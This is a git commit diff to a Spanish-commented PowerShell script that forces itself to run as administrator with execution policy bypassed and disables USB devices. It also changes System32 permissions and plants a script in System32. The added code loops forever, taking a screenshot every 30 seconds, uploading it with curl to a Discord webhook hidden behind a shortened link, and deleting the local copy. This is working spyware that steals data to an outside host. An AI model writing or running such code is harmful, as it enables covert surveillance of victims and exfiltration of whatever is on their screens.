a34b010b4f734186e6aef6eb16c9cca45e001abf
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-07 03:12:11 -0500

    ciclo.ps1

--- ciclo.ps1
+++ ciclo.ps1
@@ -1,12 +1,15 @@
 # Verificar si el script se está ejecutando con privilegios elevados (como administrador)
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    # Si no se está ejecutando como administrador, relanzar el script con privilegios elevados
+    # Si no se está ejecutando como administrador, relanzar el script con privilegios elevados y ejecución de scripts habilitada
     Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     Exit
 }
 
+# Forzar cambios en los dispositivos USB sin mostrar mensaje de Windows
+(Get-WmiObject -Class Win32_PnPEntity | Where-Object { $_.Name -like "*USB*" }).Disable()
+
 # Definir la URL del webhook de Discord
-$hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord
+$hookurl = "Uhttps://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord
 
 # Definir el nombre del directorio y el script
 $directoryName = "C:\Windows\System32\Scripts"
@@ -28,10 +31,39 @@ Set-Acl -Path $system32Path -AclObject $system32ACL
 
 # Definir el contenido del script
 $scriptContent = @"
-# Forzar cambios en los dispositivos USB sin mostrar mensaje de Windows
-(Get-WmiObject -Class Win32_PnPEntity | Where-Object { `$_.Name -like "*USB*" }).Disable()
+`$hookurl = "$hookurl"
+`$seconds = 30 # Intervalo de captura de pantalla en segundos
+`$a = 0 # Contador de capturas de pantalla
 
-# Definir las demás partes del script...
+# Bucle infinito para tomar capturas de pantalla continuamente
+while (`$true) {
+    `$a++
+    `$Filett = "$env:temp\SC_$a.png"  # Ruta del archivo de la captura de pantalla
+    
+    # Obtiene las dimensiones de la pantalla virtual
+    `$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    `$Width = `$Screen.Width
+    `$Height = `$Screen.Height
+    `$Left = `$Screen.Left
+    `$Top = `$Screen.Top
+    
+    # Crea un objeto Bitmap y copia la pantalla en él
+    `$bitmap = New-Object System.Drawing.Bitmap `$Width, `$Height
+    `$graphic = [System.Drawing.Graphics]::FromImage(`$bitmap)
+    `$graphic.CopyFromScreen(`$Left, `$Top, 0, 0, `$bitmap.Size)
+    
+    # Guarda la captura de pantalla como un archivo PNG
+    `$bitmap.Save(`$Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    
+    # Envía la captura de pantalla al webhook de Discord
+    curl.exe -F "file1=@`$Filett" `$hookurl
+    
+    # Elimina el archivo de la captura de pantalla
+    Remove-Item -Path `$Filett
+    
+    # Espera el intervalo de tiempo especificado antes de tomar otra captura de pantalla
+    Start-Sleep -Seconds `$seconds
+}
 "@
 
 # Guardar el script en el archivo
